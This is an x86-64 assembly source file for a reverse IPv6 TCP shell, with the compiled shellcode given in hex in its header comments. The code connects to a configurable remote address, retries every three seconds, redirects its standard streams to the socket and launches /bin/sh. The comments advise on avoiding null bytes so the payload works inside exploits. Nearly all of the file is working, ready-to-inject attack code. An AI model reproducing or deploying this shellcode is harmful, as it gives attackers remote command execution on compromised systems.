[BITS 64]

; **reverse ip6 tcp shell
; * size >= 113 bytes (depends of ip addr, default is ::1)
; * nullbytes free (depends only on ip addr,
;   you could always and the ip add to remove
;   the nulls like i did with the port)
; * it sleeps and then tries to recconect (default 3 seconds)
;
;shell =
;"\x6a\x0a\x5f\x6a\x01\x5e\x48\x31\xd2\x6a\x29\x58\x0f\x05\x50\x5b"
;"\x52\x48\xb9\x00\x00\x00\x00\x00\x00\x01\x51\xb9\x00\x00\x00\x00"
;"\x51\xba\xff\xff\x05\xc0\x66\x21\xfa\x52\x48\x31\xf6\x56\x6a\x03"
;"\x54\x5f\x6a\x23\x58\x0f\x05\x59\x59\x53\x5f\x54\x5e\x6a\x1c\x5a"
;"\x6a\x2a\x58\x0f\x05\x48\x85\xc0\x75\xe0\x48\x96\x6a\x03\x5e\x6a"
;"\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbf\x2f\x2f\x62\x69\x2f"
;"\x73\x68\x56\x57\x48\x31\xd2\x54\x5f\x6a\x3b\x58\x0f\x05"
;
; again, the nulls propably won't even come up with your global ip addr
; if they do, and you don't encodee the payload, you could do some
; bitwise operations
;
; made by srakai (github.com/Srakai)


AF_INET6 	equ 10
SOCK_STREAM	equ 1
SOCKET 		equ 41
CONNECT 	equ 42
DUP2 		equ 33
EXECVE 		equ 59
NANOSLEEP 	equ 35

section .text

global _start

_start:

; socket()

push 	AF_INET6
pop 	rdi
push 	SOCK_STREAM
pop 	rsi
xor 	rdx, rdx
push 	SOCKET
pop 	rax
syscall

push 	rax
pop 	rbx

; create struct sockaddr_in6
push	rdx			;scope id = 0
mov 	rcx, 0x0100000000000000 ;sin6_addr 	for local link use:
push 	rcx                     ;sin6_addr 	0x0100000000000000
mov 	rcx, 0x0000000000000000 ;sin6_addr 	0x0000000000000000
push 	rcx 			;sin6_addr
mov 	edx, 0xc005FFFF 	;sin6_flowinfo=0 , family=AF_INET6, port=1472
and 	dx, di 			;to change port change P, 0xPPPP000A
push 	rdx

sleep:

xor 	rsi, rsi
; struct timespec
push 	rsi 		;push 0
push 	3 		;seconds to sleep

; nanosleep()
push 	rsp
pop 	rdi
push 	NANOSLEEP
pop 	rax
syscall

pop 	rcx 		;clear stack
pop 	rcx

; connect()
push 	rbx
pop 	rdi
push 	rsp
pop 	rsi
push 	28 		;sizeof struct
pop 	rdx
push 	CONNECT
pop 	rax
syscall

test 	rax, rax 	;if (rax&rax) ==0
jnz 	sleep

; dup2()
xchg 	rsi, rax 	;rsi=0
push 	3
pop 	rsi
dup2:
push 	DUP2
pop 	rax
dec 	rsi
syscall
jnz 	dup2

; execve()
mov 	rdi, 0x68732f6e69622f2f
push 	rsi
push 	rdi
xor 	rdx, rdx
push 	rsp
pop 	rdi
push 	EXECVE
pop 	rax
syscall